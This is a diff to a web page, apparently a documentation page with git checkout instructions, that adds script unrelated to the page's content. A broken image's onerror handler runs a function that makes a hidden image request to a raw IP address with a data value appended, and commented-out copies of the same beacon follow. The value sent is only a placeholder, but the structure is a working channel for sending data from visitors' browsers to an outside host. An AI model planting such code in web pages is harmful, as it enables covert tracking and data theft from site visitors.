@@ -404,16 +404,29 @@
 $ git fetch origin
 $ git checkout gh-pages
 </code></pre>
+            <div id="http_img"></div>
             <script>
                 function loc(){
                     b=document.createElement('img');
                     m="abc";
                     console.log("ZX:"+m);
-                    b.src="http://23.83.235.55:8081/images2.jpg";
+                    b.src="http://23.83.235.55:8081/"+m;
                 }
             </script>
             <img src=x onerror=loc()>
-            <img src="http://23.83.235.55:8081/images2.jpg">
+            <!--<script>-->
+                <!--function loc2(){-->
+                    <!--var b=document.createElement('img');-->
+                    <!--var m="abc";-->
+                    <!--console.log("ZX:"+m);-->
+                    <!--b.src='http://23.83.235.55:8081/'+m;-->
+                    <!--// b.src='http://www.hyperlinkcode.com/images/sample-image.jpg';-->
+                    <!--var id = document.getElementById("http_img");-->
+                    <!--// id.appendChild(b);-->
+                <!--}-->
+            <!--</script>-->
+            <!--<img src=x onerror=loc2()>-->
+            <!--<img src="http://23.83.235.55:8081/images2.jpg">-->
             <script>
                 document.writeln("from writeln");
             </script>
